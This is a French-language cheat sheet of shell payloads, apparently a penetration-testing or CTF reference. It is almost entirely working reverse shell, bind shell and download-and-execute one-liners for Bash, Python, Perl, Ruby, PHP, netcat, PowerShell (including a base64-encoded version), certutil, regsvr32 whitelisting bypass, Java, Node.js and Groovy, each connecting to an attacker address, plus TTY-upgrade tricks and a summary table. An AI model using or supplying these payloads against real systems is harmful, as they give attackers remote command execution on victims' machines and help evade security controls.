# Shell Payloads

Cette section présente les payloads pour différentes plateformes, organisés par système d'exploitation et langage.
## Linux/Unix
### Bash
```bash
# Reverse shell basique
bash -i >& /dev/tcp/10.10.10.10/443 0>&1

# Alternative avec /dev/udp
bash -i >& /dev/udp/10.10.10.10/443 0>&1

# Avec exec (utile en cas de redirection)
exec bash -i &>/dev/tcp/10.10.10.10/443 0>&1
```
### Python
```python
# Python 2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'

# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.run(["/bin/sh","-i"]);'

# Bind shell Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",4444));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
```
### Perl
```perl
perl -e 'use Socket;$i="10.10.10.10";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
### Ruby
```ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.10.10","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
### PHP
```php
php -r '$sock=fsockopen("10.10.10.10",443);exec("/bin/sh -i <&3 >&3 2>&3");'
```
### Netcat
```bash
# Si nc supporte l'option -e
nc -e /bin/sh 10.10.10.10 443

# Sans l'option -e (compatible avec la plupart des versions)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.10.10 443 > /tmp/f
```
## Windows
### PowerShell

```powershell
# One-liner reverse shell complet
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Version encodée (utile pour éviter les problèmes de guillemets)
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQAwAC4AMQAwACcALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAJwBQAFMAIAAnACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
```

### Netcat (Windows)
```powershell
# Si nc.exe est disponible
nc.exe -e cmd.exe 10.10.10.10 443

# Alternative avec PowerShell (téléchargement et exécution)
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 443"
```
### Certutil (téléchargement et exécution)
```cmd
certutil -urlcache -split -f http://10.10.10.10/payload.exe C:\Windows\Temp\payload.exe & C:\Windows\Temp\payload.exe
```
### Regsvr32 (Application Whitelisting Bypass)

```cmd
regsvr32 /s /n /u /i:http://10.10.10.10/payload.sct scrobj.dll
```
## Multi-plateformes
### Java
```java
r = Runtime.getRuntime();
p = r.exec(["/bin/bash", "-c", "exec 5<>/dev/tcp/10.10.10.10/443;cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[]);
p.waitFor();
```
### JavaScript (Node.js)
```javascript
// Nécessite Node.js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(443, "10.10.10.10", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```
### Groovy
```groovy
String host="10.10.10.10";
int port=443;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
    while(pi.available()>0)so.write(pi.read());
    while(pe.available()>0)so.write(pe.read());
    while(si.available()>0)po.write(si.read());
    so.flush();
    po.flush();
    Thread.sleep(50);
    try {
        p.exitValue();
        break;
    }
    catch (Exception e){}
};
s.close();
```
## Techniques pour Générer un Shell Interactif
### Python
```python
python -c 'import pty; pty.spawn("/bin/bash")'
```
### Script
```bash
script -qc /bin/bash /dev/null
```
### Perl
```perl
perl -e 'exec "/bin/bash";'
```
### Socat
```bash
# Sur l'attaquant
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Sur la cible
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444
```
## Cheatsheet pour la Mémorisation Rapide

| Langage    | Commande Simplifiée                                                                                                                                                                                             |     |                                |
| ---------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --- | ------------------------------ |
| Bash       | `bash -i >& /dev/tcp/IP/PORT 0>&1`                                                                                                                                                                              |     |                                |
| Python     | `python -c 'import os,pty,socket;s=socket.socket();s.connect(("IP",PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'`                                                                     |     |                                |
| PowerShell | `powershell -e <BASE64_ENCODED_PAYLOAD>`                                                                                                                                                                        |     |                                |
| PHP        | `php -r '$s=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'`                                                                                                                                             |     |                                |
| Perl       | `perl -e 'use Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'` |     |                                |
| Ruby       | `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("IP","PORT");loop{c.gets.chomp!;(IO.popen(c.gets,"r"){                                                                                                          | io  | c.print io.read}rescue nil)}'` |